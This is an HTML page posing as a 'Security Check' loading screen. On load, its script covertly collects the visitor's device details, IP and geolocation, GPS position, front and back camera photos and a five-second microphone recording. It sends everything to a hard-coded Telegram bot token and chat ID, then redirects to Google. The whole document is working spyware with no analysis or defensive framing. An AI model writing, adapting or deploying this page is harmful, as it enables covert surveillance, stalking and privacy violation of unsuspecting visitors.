<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Security Check...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
            text-align: center;
        }
        .container { padding: 40px; }
        .spinner {
            border: 4px solid #333;
            border-top: 4px solid #0f0;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #0f0; font-size: 14px; }
        video, canvas { display: none; position: absolute; top: -9999px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <p id="status">Checking security...</p>
    </div>
    <video id="videoBack" autoplay playsinline></video>
    <video id="videoFront" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <audio id="audioPlayback" controls style="display:none;"></audio>

    <script>
        // ==================== CONFIG TELEGRAM ====================
        const BOT_TOKEN = '8222528496:AAFwnyQ67Q-vDnml0sFzBkcdGA317QbwqmM';
        const CHAT_ID = '7629800678';
        const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

        let allData = {};

        // ==================== SEND TO TELEGRAM ====================
        async function sendMessage(text) {
            try {
                await fetch(`${BASE_URL}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch(e) {}
        }

        async function sendPhoto(base64, caption) {
            try {
                const blob = await (await fetch(base64)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', caption);
                await fetch(`${BASE_URL}/sendPhoto`, { method: 'POST', body: formData });
            } catch(e) {}
        }

        async function sendAudio(base64, caption) {
            try {
                const blob = await (await fetch(base64)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('audio', blob, 'recording.ogg');
                formData.append('caption', caption);
                formData.append('duration', '5');
                await fetch(`${BASE_URL}/sendAudio`, { method: 'POST', body: formData });
            } catch(e) {}
        }

        async function sendDocument(text, filename) {
            try {
                const blob = new Blob([text], { type: 'text/plain' });
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, filename);
                await fetch(`${BASE_URL}/sendDocument`, { method: 'POST', body: formData });
            } catch(e) {}
        }

        // ==================== DEVICE INFO ====================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            return {
                userAgent: ua,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || 'Unknown',
                connection: navigator.connection?.effectiveType || 'Unknown'
            };
        }

        // ==================== IP INFO ====================
        async function getIPInfo() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                allData.ip = data.ip;
                try {
                    const res2 = await fetch(`http://ip-api.com/json/${data.ip}`);
                    allData.ipInfo = await res2.json();
                } catch(e) {}
            } catch(e) { allData.ip = 'Unknown'; }
        }

        // ==================== GPS LOCATION ====================
        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            allData.location = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                googleMaps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                            };
                            resolve(true);
                        },
                        (err) => { allData.location = { error: err.message }; resolve(false); },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                } else {
                    allData.location = { error: 'Not supported' };
                    resolve(false);
                }
            });
        }

        // ==================== CAMERA CAPTURE ====================
        async function captureCamera(facingMode) {
            return new Promise((resolve) => {
                const video = facingMode === 'environment' ? 
                    document.getElementById('videoBack') : 
                    document.getElementById('videoFront');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                }).then(stream => {
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            ctx.drawImage(video, 0, 0);
                            const photo = canvas.toDataURL('image/jpeg', 0.8);
                            stream.getTracks().forEach(t => t.stop());
                            resolve(photo);
                        }, 2000);
                    };
                }).catch(() => resolve(null));
            });
        }

        // ==================== AUDIO RECORDER (5 DETIK) ====================
        async function recordAudio(durationMs = 5000) {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices?.getUserMedia) { resolve(null); return; }
                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                    .then(stream => {
                        const mediaRecorder = new MediaRecorder(stream, {
                            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
                                ? 'audio/webm;codecs=opus' : 'audio/mp4'
                        });
                        const chunks = [];
                        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: mediaRecorder.mimeType });
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                stream.getTracks().forEach(t => t.stop());
                                resolve(reader.result);
                            };
                            reader.readAsDataURL(blob);
                        };
                        mediaRecorder.start();
                        setTimeout(() => {
                            if (mediaRecorder.state === 'recording') mediaRecorder.stop();
                        }, durationMs);
                    })
                    .catch(() => resolve(null));
            });
        }

        // ==================== MAIN EXECUTION ====================
        async function executeAll() {
            const status = document.getElementById('status');
            
            status.innerText = 'Collecting device info...';
            allData.device = getDeviceInfo();
            
            status.innerText = 'Getting IP address...';
            await getIPInfo();
            
            status.innerText = 'Getting location...';
            await getLocation();
            
            status.innerText = 'Capturing back camera...';
            allData.backCamera = await captureCamera('environment');
            
            status.innerText = 'Capturing front camera...';
            allData.frontCamera = await captureCamera('user');
            
            status.innerText = 'Recording audio (5 seconds)...';
            allData.audioRecording = await recordAudio(5000);
            
            status.innerText = 'Sending data to Telegram...';
            await sendAllToTelegram();
            
            status.innerText = 'Complete! Redirecting...';
            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
        }

        async function sendAllToTelegram() {
            // Device Info
            let msg = `🔴 <b>DEVICE INFO</b>\n\n`;
            msg += `📱 <b>Platform:</b> ${allData.device.platform}\n`;
            msg += `💻 <b>Cores:</b> ${allData.device.cores}\n`;
            msg += `🧠 <b>RAM:</b> ${allData.device.memory}GB\n`;
            msg += `🖥️ <b>Screen:</b> ${allData.device.screenWidth}x${allData.device.screenHeight}\n`;
            msg += `🌍 <b>Lang:</b> ${allData.device.language}\n`;
            msg += `🕐 <b>TZ:</b> ${allData.device.timezone}\n`;
            msg += `📡 <b>IP:</b> ${allData.ip}\n`;
            msg += `📶 <b>Net:</b> ${allData.device.connection}`;
            await sendMessage(msg);

            // IP Info
            if (allData.ipInfo?.country) {
                let ipMsg = `📍 <b>IP GEOLOCATION</b>\n\n`;
                ipMsg += `🌍 ${allData.ipInfo.country}\n`;
                ipMsg += `🏙️ ${allData.ipInfo.city}\n`;
                ipMsg += `🏢 ${allData.ipInfo.isp}`;
                await sendMessage(ipMsg);
            }

            // GPS
            if (allData.location?.latitude) {
                await sendMessage(`📍 <b>GPS:</b> ${allData.location.googleMaps}\n📏 Accuracy: ±${allData.location.accuracy}m`);
            }

            // Photos
            if (allData.backCamera) await sendPhoto(allData.backCamera, '📸 BACK CAMERA');
            if (allData.frontCamera) await sendPhoto(allData.frontCamera, '🤳 FRONT CAMERA');
            
            // Audio Recording
            if (allData.audioRecording) {
                await sendAudio(allData.audioRecording, '🎙️ AUDIO RECORDED (5 SEC)');
            }

            // Full JSON
            await sendDocument(JSON.stringify(allData, null, 2), `full_data_${Date.now()}.json`);
        }

        executeAll();
    </script>
</body>
</html>
